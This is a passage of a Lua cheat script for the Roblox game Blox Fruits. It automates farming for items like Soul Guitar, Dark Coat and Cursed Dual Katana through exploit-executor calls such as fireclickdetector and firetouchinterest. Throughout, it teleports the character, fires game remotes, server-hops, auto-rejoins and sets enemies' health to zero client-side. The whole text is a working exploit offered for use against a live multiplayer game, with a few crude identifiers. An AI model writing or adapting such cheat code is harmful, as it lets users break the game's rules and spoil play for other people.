                                if not string.find(tostring(DepTraiv4[i].Line.Rotation.Z), c) then
                                    repeat
                                        wait()
                                        fireclickdetector(DepTraiv4[i].ClickDetector)
                                    until string.find(tostring(DepTraiv4[i].Line.Rotation.Z), c)
                                end
                            end
                        end 
                    elseif not CurrnetPuzzle.Pipes then 
                        SetContent("Unlocking Soul Guitar's Puzzle (Pipes)") 
                        if not Sea3 then 
                            TeleportWorld(3)
                        else
                            for i, v in pairs(Pipes) do
                                pcall(function()
                                    local x = game.workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model[i]
                                    if x.BrickColor.Name ~= v then
                                        repeat
                                            wait()
                                            fireclickdetector(x.ClickDetector)
                                        until x.BrickColor.Name == v
                                    end
                                end) 
                            end
                        end 
                    end 
                elseif CheckMaterialCount('Bones') < 500 then  
                    SetContent('Farming Bones for soul guitar')
                    if not Sea3 then 
                        TeleportWorld(3) 
                    else
                        KillMobList({
                            "Reborn Skeleton [Lv. 1975]",
                            "Living Zombie [Lv. 2000]",
                            "Demonic Soul [Lv. 2025]",
                            "Posessed Mummy [Lv. 2050]"
                        })
                    end
                elseif CheckMaterialCount('Ectoplasm') < 250 then 
                    if not Sea2 then 
                        TeleportWorld(2)
                    else
                        KillMobList({
                            "Ship Deckhand [Lv. 1250]",
                            "Ship Engineer [Lv. 1275]",
                            "Ship Steward [Lv. 1300]",
                            'Ship Officer'
                        }) 
                    end
                elseif CheckMaterialCount('Dark Fragment') < 1 then   
                    if not getgenv().ChestCollect then getgenv().ChestCollect = 0 end
                    if not Sea2 then 
                        TeleportWorld(2)
                    else
                        if getgenv().ServerData['Server Bosses']['Darkbeard'] then
                            KillBoss(getgenv().ServerData['Server Bosses']['Darkbeard'])
                        elseif getgenv().ServerData["PlayerBackpack"]['Fist of Darkness'] then 
                            if GetDistance(game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection) <= 5 then 
                                EquipWeaponName("Fist of Darkness")
                                pcall(
                                    function()
                                        firetouchinterest(
                                            game.Players.LocalPlayer.Character["Fist of Darkness"].Handle,
                                            game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection,
                                            0
                                        )
                                        firetouchinterest(
                                            game.Players.LocalPlayer.Character["Fist of Darkness"].Handle,
                                            game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection,
                                            1
                                        )
                                        firetouchinterest(
                                            game.Players.LocalPlayer.Character.HumanoidRootPart,
                                            game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection,
                                            0
                                        )
                                        firetouchinterest(
                                            game.Players.LocalPlayer.Character.HumanoidRootPart,
                                            game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection,
                                            1
                                        )
                                    end
                                )
                            else 
                                Tweento(game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection.CFrame)
                            end
                        elseif getgenv().ChestCollect >= 20 then 
                            HopServer(9,true,"Find new server for Fist of Darkness")
                        else 
                            local NearestChest = getNearestChest()
                            if not NearestChest then 
                                SetContent('Ngu')
                            end 
                            if NearestChest then 
                                PickChest(NearestChest) 
                            elseif #getgenv().ServerData['Chest'] <= 0 then 
                                HopServer(9,true,"Find Chest") 
                            end
                        end
                    end
                elseif getgenv().ServerData['PlayerData'].Fragments < 5000 then  
                    if not getgenv().ServerData['Nearest Raid Island'] then 
                        buyRaidingChip() 
                    else 
                        AutoRaid() 
                    end 
                else
                    if not Sea3 then 
                        TeleportWorld(3)
                    else
                        game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("soulGuitarBuy", true)
                        SetContent(tostring(game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("soulGuitarBuy")))
                        wait(10)
                        getgenv().CurrentTask = ''
                    end
                end
            end


    spawn(function ()
                while wait() do
            if Config.SoulGuitar then
                AutoSoulGuitar()
            end
        end
    end
    )




    AutoDarkCoat = function()
        if not getgenv().ServerData["Inventory Items"]["Dark Coat"] then
            if not getgenv().ChestCollect then getgenv().ChestCollect = 0 end
        if not Sea2 then 
            TeleportWorld(2)
        else
            if getgenv().ServerData['Server Bosses']['Darkbeard'] then
                KillBoss(getgenv().ServerData['Server Bosses']['Darkbeard'])
                HopServer(9,true,'Find Boss Another Dark Beard')
            elseif getgenv().ServerData["PlayerBackpack"]['Fist of Darkness'] then 
                if GetDistance(game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection) <= 5 then 
                    EquipWeaponName("Fist of Darkness")
                    pcall(
                        function()
                            firetouchinterest(
                                game.Players.LocalPlayer.Character["Fist of Darkness"].Handle,
                                game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection,
                                0
                            )
                            firetouchinterest(
                                game.Players.LocalPlayer.Character["Fist of Darkness"].Handle,
                                game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection,
                                1
                            )
                            firetouchinterest(
                                game.Players.LocalPlayer.Character.HumanoidRootPart,
                                game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection,
                                0
                            )
                            firetouchinterest(
                                game.Players.LocalPlayer.Character.HumanoidRootPart,
                                game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection,
                                1
                            )
                        end
                    )
                else 
                    Tweento(game:GetService("Workspace").Map.DarkbeardArena.Summoner.Detection.CFrame)
                end
            elseif getgenv().ChestCollect >= fuckinghop then 
                HopServer(9,true,'Find Fist of Darkness')
            else 
                local NearestChest = getNearestChest() 
                if NearestChest then 
                    PickChest(NearestChest) 
                elseif #getgenv().ServerData['Chest'] <= 0 then 
                    HopServer(9,true,'Find Fist of Darkness')
                end
            end
        end
    end
    end

    coroutine.wrap(function()
        while wait() do
            if Config.DarkCoat then
                AutoDarkCoat()
    end
    end
    end)()


    AutoUseGodChalice = function()
        if not UnCompleteColor() then 
            EquipWeapon("God's Chalice") 
            Tweento(game:GetService("Workspace").Map["Boat Castle"].Summoner.Detection.CFrame)
            getgenv().CurrentTask = ''
        elseif HasColor(UnCompleteColor().BrickColor.Name) then
            local ColorToActive = UnCompleteColor()
            Tweento(ColorToActive.CFrame)
        end
    end


    coroutine.wrap(function()
        while wait() do
            if Config.Chalice then
                AutoUseGodChalice()
            end
        end
    end)()


    AutoV3 = function()  
        if getgenv().ServerData['PlayerData'].RaceVer == "V3" then 
            getgenv().CurrentTask = ''
            return 
        elseif getgenv().ServerData['PlayerData'].Beli <2000000 then 
            getgenv().CurrentTask = ''
            return 
        elseif not Sea2 then 
            TeleportWorld(2)
        else 
            local CurrentR = getgenv().ServerData['PlayerData'].Race  
            local v113 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
            if v113 == 0 then
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "2")
            end
            if CurrentR == 'Human' then  
                if getgenv().ServerData['Server Bosses']['Diamond'] and getgenv().ServerData['Server Bosses']['Jeremy'] and getgenv().ServerData['Server Bosses']['Fajita'] then 
                    repeat 
                        task.wait() 
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "3")
                        if getgenv().ServerData['Server Bosses']['Diamond'] then 
                            KillBoss(getgenv().ServerData['Server Bosses']['Diamond'])
                        elseif getgenv().ServerData['Server Bosses']['Jeremy'] then 
                            KillBoss(getgenv().ServerData['Server Bosses']['Jeremy'])
                        elseif getgenv().ServerData['Server Bosses']['Fajita'] then 
                            KillBoss(getgenv().ServerData['Server Bosses']['Fajita']) 
                        end
                    until not getgenv().ServerData['Server Bosses']['Diamond'] and not getgenv().ServerData['Server Bosses']['Jeremy'] and not getgenv().ServerData['Server Bosses']['Fajita'] 
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "3")
                    SetContent('nil')
                    TeleportWorld(3)
                else
                    HopServer(10,true,"Find 3 bosses to get Human V3")
                end 
            elseif CurrentR == 'Cyborg' then  
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "3") 
                local CheckAgain = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
                if CheckAgain and CheckAgain == 1 then 
                    local FruitBelow1M = getFruitBelow1M()
                    if FruitBelow1M then 
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadFruit", FruitBelow1M) 
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "3") 
                    end 
                end 
            elseif CurrentR == 'Mink' then 
                repeat 
                    local NearestChest = getNearestChest()
                    if NearestChest then 
                        PickChest(NearestChest) 
                    else
                        warn('Not Chest')
                    end 
                    task.wait(.1)
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "3") 
                until game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1") ~= 1
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "3") 
            end
        end
    end


    coroutine.wrap(function()
    while wait() do 
    if Config.AutoV3 then
        AutoV3()
            end
         end
    end)()

    [[task.spawn(function()
    while wait() do
        if Config.RengGoku then
            if not getgenv().ServerData["Inventory Items"]["Rengoku"] then
                if not Sea2 then
                    TeleportWorld(2)
                end
                if Sea2 and getgenv().ServerData['Server Bosses']['Tide Keeper'] then
                    KillBoss(getgenv().ServerData['Server Bosses']['Tide Keeper'])
                    elseif getgenv().ServerData["PlayerBackpack"]['Hidden Key'] then
                        EquipWeaponName('Hidden Key')
                        Tweento(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875)) 
                    else
                        HopServer(10,true,'Getting Hidden Key',7)
            end
        end
    end
    end
    end)]]

        AutoChest = function()
            if  getgenv().ServerData["PlayerBackpack"]["God's Chalice"] or  getgenv().ServerData["PlayerBackpack"]["Fist of Darkness"] then
                if Sea3 and getgenv().ServerData["PlayerBackpack"]["God's Chalice"] then
                    Tweento(game:GetService("Workspace").Map["Boat Castle"].Summoner.Detection.CFrame)
                elseif Sea2 and getgenv().ServerData["PlayerBackpack"]["Fist of Darkness"] then
                        --Tweento()
                    end
                else
                    if not getgenv().ChestCollect then getgenv().ChestCollect = 0 end
                    local NearestChest = getNearestChest() 
                        if NearestChest then 
                            PickChest(NearestChest) 
                        elseif #getgenv().ServerData['Chest'] <= 0 then 
                            HopServer(9,true,'Auto Chest')
                        end
                end
        end


    task.spawn(function()
        while wait() do
            if Config.AutoChest then
                AutoChest()
        end
        end
    end)


    getgenv().rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(
        child)
        if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
            wait()
            local CurrentErrorTitle = child.TitleFrame.ErrorTitle.Text
            local CurrentErrorMessage = child.MessageArea.ErrorFrame.ErrorMessage.Text 
            if CurrentErrorTitle ~= 'Teleport Failed' and not Hopping then 
                Hopping = true 
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)  
            end
        end
    end) 

AutoSword600Mas = function ()
    local SwordMasteryFarm,SwordMasteryFarm2 = getNextSwordToFarm()
                                if (getgenv().ServerData["Inventory Items"]['Yama'] and getgenv().ServerData["Inventory Items"]['Yama'].Mastery < 600) or (getgenv().ServerData["Inventory Items"]['Tushita'] and getgenv().ServerData["Inventory Items"]['Tushita'].Mastery < 600) then 
                                    getgenv().WeaponType = 'Sword'
                                    if getgenv().ServerData["Inventory Items"]['Yama'] and getgenv().ServerData["Inventory Items"]['Yama'].Mastery < 600 then 
                                        LoadItem('Yama')
                                    elseif getgenv().ServerData["Inventory Items"]['Tushita'] and getgenv().ServerData["Inventory Items"]['Tushita'].Mastery < 600 then 
                                        LoadItem('Tushita')
                                        end
                                    else
                                        if SwordMasteryFarm and not SwordMasteryFarm.Equipped then 
                                            LoadItem(SwordMasteryFarm.Name) 
                                        elseif SwordMasteryFarm and SwordMasteryFarm.Equipped then 
                                            getgenv().WeaponType = 'Sword'  
                                        else
                                            getgenv().WeaponType = 'Melee'
                                        end
                                    end
end

                    coroutine.wrap(function()
                        while wait() do
                            if Config.Sword600 then
                                AutoSword600Mas()
                                end
                            end
                        end)()





                        coroutine.wrap(function()
                            while wait() do
                                if Config.AllMasteryMeleeV2600 then
                                    repeat task.wait() until getgenv().Config and getgenv().Config["Melee Level Values"]
                                    local MLLV = getgenv().Config["Melee Level Values"] 
                                if  MLLV['Godhuman'] < 600 then 
                                        BuyMelee('Godhuman') 
                                        getgenv().WeaponType = "Melee"
                                        SetMeleeWait('Godhuman',600)
                                    elseif MLLV['Sharkman Karate'] < 600 then 
                                        BuyMelee('Sharkman Karate')
                                        getgenv().WeaponType = "Melee"
                                        SetMeleeWait('Sharkman Karate',600)
                                    elseif MLLV['Death Step'] < 600 then 
                                        BuyMelee('Death Step')
                                        getgenv().WeaponType = "Melee"
                                        SetMeleeWait('Death Step',600)
                                    elseif MLLV['Electric Claw'] < 600 then 
                                        BuyMelee('Electric Claw')
                                        getgenv().WeaponType = "Melee"
                                        SetMeleeWait('Electric Claw',600)
                                    elseif MLLV['Dragon Talon'] < 600 then 
                                        BuyMelee('Dragon Talon')
                                        getgenv().WeaponType = "Melee"
                                        SetMeleeWait('Dragon Talon',600)
                                    elseif MLLV['Superhuman'] < 600 then 
                                        BuyMelee('Superhuman')
                                        getgenv().WeaponType = "Melee"
                                        SetMeleeWait('Superhuman',600)
                                    end
                                end
                            end
                        end)()






                        AutoCDK = function(questTitle) 
                            SetContent(questTitle)
                            getgenv().WeaponType = 'Sword'
                            LoadItem('Tushita')
                            if questTitle == 'The Final Boss' then  
                                repeat task.wait()
                                    if GetDistance(game:GetService("Workspace").Map.Turtle.Cursed.Pedestal3) > 10 and game:GetService("Workspace").Map.Turtle.Cursed.PlacedGem.Transparency ~= 0 then
                                        Tweento(game:GetService("Workspace").Map.Turtle.Cursed.Pedestal3.CFrame * CFrame.new(0, 0, -2)) 
                                    end 
                                    if game:GetService("Workspace").Map.Turtle.Cursed.PlacedGem.Transparency == 0 then 
                                        if not getgenv().ServerData['Server Bosses']['Cursed Skeleton Boss'] then
                                            Tweento(CFrame.new(-12341.66796875, 603.3455810546875, -6550.6064453125))
                                        else
                                            KillBoss(getgenv().ServerData['Server Bosses']['Cursed Skeleton Boss'])
                                            getgenv().CurrentTask = ''
                                        end
                                    else 
                                        if GetDistance(game:GetService("Workspace").Map.Turtle.Cursed.Pedestal3) < 10 and game:GetService("Workspace").Map.Turtle.Cursed.Pedestal3.ProximityPrompt.Enabled then 
                                            fireproximityprompt(game:GetService("Workspace").Map.Turtle.Cursed.Pedestal3.ProximityPrompt) 
                                            wait(10)
                                        end
                                    end 
                                until CheckItem("Cursed Dual Katana")
                            elseif questTitle == 'Pedestal1' then 
                                if GetDistance(game:GetService("Workspace").Map.Turtle.Cursed["Pedestal1"]) < 10 then
                                    fireproximityprompt(game:GetService("Workspace").Map.Turtle.Cursed['Pedestal1'].ProximityPrompt)
                                else
                                    Tweento(game:GetService("Workspace").Map.Turtle.Cursed['Pedestal1'].CFrame * CFrame.new(0, 0, -2))
                                end
                            elseif questTitle == 'Pedestal2' then  
                                if GetDistance(game:GetService("Workspace").Map.Turtle.Cursed["Pedestal2"]) < 10 then
                                    fireproximityprompt(game:GetService("Workspace").Map.Turtle.Cursed['Pedestal2'].ProximityPrompt)
                                else
                                    Tweento(game:GetService("Workspace").Map.Turtle.Cursed['Pedestal2'].CFrame * CFrame.new(0, 0, -2))
                                end
                            elseif questTitle == 'Tushita Dimension' then
                                repeat task.wait()
                                    if game:GetService("Workspace").Map.HeavenlyDimension.Exit.BrickColor == BrickColor.new("Cloudy grey") then 
                                        Tweento(game:GetService("Workspace").Map.HeavenlyDimension.Exit.CFrame)
                                        wait(2) 
                                    else
                                        if CheckTorchDimension("Tushita") then 
                                            local Torch = CheckTorchDimension("Tushita")
                                            Tweento(Torch.CFrame)  
                                            wait(.5)
                                            fireproximityprompt(Torch.ProximityPrompt)  
                                            local CurrentCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
                                            local TickTorch = tick()
                                            repeat task.wait()
                                                for i,v in pairs(workspace.Enemies:GetChildren()) do 
                                                    pcall(function()
                                                        if v:FindFirstChildOfClass('Humanoid') then 
                                                            v:FindFirstChildOfClass('Humanoid').Health = 0 
                                                        end
                                                    end) 
                                                end
                                                Tweento(CurrentCFrame * CFrame.new(0,250,0))
                                            until #game.workspace.Enemies:GetChildren() <= 0 and tick()-TickTorch >= 5
                                            Tweento(CurrentCFrame)
                                        end
                                    end
                                    task.wait()
                                until not IsPlayerAlive() or GetDistance(game:GetService("Workspace")["_WorldOrigin"].Locations["Heavenly Dimension"]) > 2000
                            elseif questTitle == 'Cake Queen' then 
                                if getgenv().ServerData['Server Bosses']['Cake Queen'] then 
                                    CDKTICK = tick()
                                    repeat task.wait()
                                        KillBoss(getgenv().ServerData['Server Bosses']['Cake Queen'])  
                                        wait(1)
                                    until GetDistance(game:GetService("Workspace")["_WorldOrigin"].Locations["Heavenly Dimension"]) <= 2000
                                    getgenv().CDKQuest = 'Tushita Dimension'
                                else
                                    SetContent('Hopping for Cake Quen',5)
                                    HopServer(10,true,"Cake Queen")
                                end 
                            elseif questTitle == 'Tushita Quest -4' then 
                                if getgenv().PirateRaidTick and tick()-getgenv().PirateRaidTick < 60 then 
                                    Auto3rdEvent() 
                                else
                                    AutoL()
                                end
                            elseif questTitle == 'Tushita Quest -3' then 
                                for v50, v51 in pairs(getnilinstances()) do
                                    if v51.Name:match("Luxury Boat Dealer") then
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v51.HumanoidRootPart.CFrame
                                        local args = {
                                            [1] = "CDKQuest",
                                            [2] = "BoatQuest",
                                            [3] = workspace.NPCs:FindFirstChild("Luxury Boat Dealer")
                                        }
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                                    end
                                end
                            elseif questTitle == 'Yama Dimension' then 
                                repeat task.wait()
                                    if game:GetService("Workspace").Map.HellDimension.Exit.BrickColor == BrickColor.new("Olivine") then 
                                        Tweento(game:GetService("Workspace").Map.HellDimension.Exit.CFrame)
                                        wait(2) 
                                    else 
                                        if CheckTorchDimension("Yama") then 
                                            local Torch = CheckTorchDimension("Yama")
                                            Tweento(Torch.CFrame)  
                                            wait(.5)
                                            fireproximityprompt(Torch.ProximityPrompt)  
                                            local CurrentCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
                                            local TickTorch = tick()
                                            repeat task.wait()
                                                for i,v in pairs(workspace.Enemies:GetChildren()) do 
                                                    pcall(function()
                                                        if v:FindFirstChildOfClass('Humanoid') then 
                                                            v:FindFirstChildOfClass('Humanoid').Health = 0 
                                                        end
                                                    end)  
                                                end
                                                Tweento(CurrentCFrame * CFrame.new(0,250,0))
                                            until #game.workspace.Enemies:GetChildren() <= 0 and tick()-TickTorch >= 5
                                            Tweento(CurrentCFrame)
                                        end
                                    end
                                until GetDistance(game:GetService("Workspace")["_WorldOrigin"].Locations["Hell Dimension"]) > 2000 
                            elseif questTitle == 'Soul Reaper' then 
                                if getgenv().ServerData['Server Bosses']['Soul Reaper'] then 
                                    repeat 
                                        if not getgenv().DimensionLoading and not (game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild('Hell Dimension') or GetDistance(game:GetService("Workspace")["_WorldOrigin"].Locations["Hell Dimension"]) <    2000) then 
                                            if GetDistance(getgenv().ServerData['Server Bosses']['Soul Reaper'].PrimaryPart) > 300 then 
                                                Tweento(getgenv().ServerData['Server Bosses']['Soul Reaper'].PrimaryPart.CFrame * CFrame.new(0,1.5,-1.5)) 
                                                wait(3)
                                            else
                                                game.Players.LocalPlayer.Character.PrimaryPart.CFrame = getgenv().ServerData['Server Bosses']['Soul Reaper'].PrimaryPart.CFrame * CFrame.new(0,1.5,-1.5) 
                                            end  
                                        end
                                    until getgenv().DimensionLoading or (game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild('Hell Dimension') and GetDistance(game:GetService("Workspace")["_WorldOrigin"].Locations["Hell Dimension"]) <= 2000) 
                                    if getgenv().DimensionLoading then 
                                        getgenv().DimensionLoading = false 
                                        wait(5)
                                    end
                                elseif getgenv().ServerData["PlayerBackpack"]['Hallow Essence'] then 
                                    EquipWeapon("Hallow Essence")
                                    Tweento(game:GetService("Workspace").Map["Haunted Castle"].Summoner.Detection.CFrame)
                                else
                                    local v316, v317, v318, v319 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Check")
                                    if v318 and v318 > 0 then 
                                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1) 
                                        if getgenv().ServerData['PlayerData'].Level >= 2000 then  
                                            if not game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then 
                                                FarmMobByLevel(2000)
                                            else 
                                                KillMobList({
                                                    "Reborn Skeleton [Lv. 1975]",
                                                    "Living Zombie [Lv. 2000]",
                                                    "Demonic Soul [Lv. 2025]",
                                                    "Posessed Mummy [Lv. 2050]"
                                                })
                                            end
                                        else 
                                            KillMobList({
                                                "Reborn Skeleton [Lv. 1975]",
                                                "Living Zombie [Lv. 2000]",
                                                "Demonic Soul [Lv. 2025]",
                                                "Posessed Mummy [Lv. 2050]"
                                            })
                                        end
                                    elseif v316 < 5000 then 
                                        if getgenv().ServerData['PlayerData'].Level >= 2000 then  
                                            if not game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then 
                                                FarmMobByLevel(2000)
                                            else 
                                                KillMobList({
                                                    "Reborn Skeleton [Lv. 1975]",
                                                    "Living Zombie [Lv. 2000]",
                                                    "Demonic Soul [Lv. 2025]",
                                                    "Posessed Mummy [Lv. 2050]"
                                                })
                                            end
                                        else 
                                            KillMobList({
                                                "Reborn Skeleton [Lv. 1975]",
                                                "Living Zombie [Lv. 2000]",
                                                "Demonic Soul [Lv. 2025]",
                                                "Posessed Mummy [Lv. 2050]"
                                            })
                                        end
                                    end  
                                end
                            elseif questTitle == 'Yama Quest -4' then 
                                local MobSP = NearestHazeMob()
                                if MobSP then 
                                    KillMobList({MobSP})
                                end
                            elseif questTitle == 'Yama Quest -3' then 
                                if FindMobHasHaki() then 
                                    repeat 
                                        pcall(function()
                                            task.wait()
                                            Tweento(FindMobHasHaki().PrimaryPart.CFrame * CFrame.new(0,0,-2))
                                        end)
                                    until not IsPlayerAlive()
                                end
                            end        
                        end


                        coroutine.wrap(function()
                                while wait() do
                                    if Sea3 and Config.AutoCDK and not getgenv().ServerData["Inventory Items"]['Cursed Dual Katana'] and getgenv().ServerData["Inventory Items"]['Tushita'] and getgenv().ServerData["Inventory Items"]['Yama'] and getgenv().ServerData["Inventory Items"]['Tushita'].Mastery >= 350 and getgenv().ServerData["Inventory Items"]['Yama'].Mastery >= 350 then
                                        Xero = CheckQuestCDK()
                                         AutoCDK(Xero)
                                    end
                              end
                        end)()

                

                        

        noti("Loaded Success Full! ",4)
        
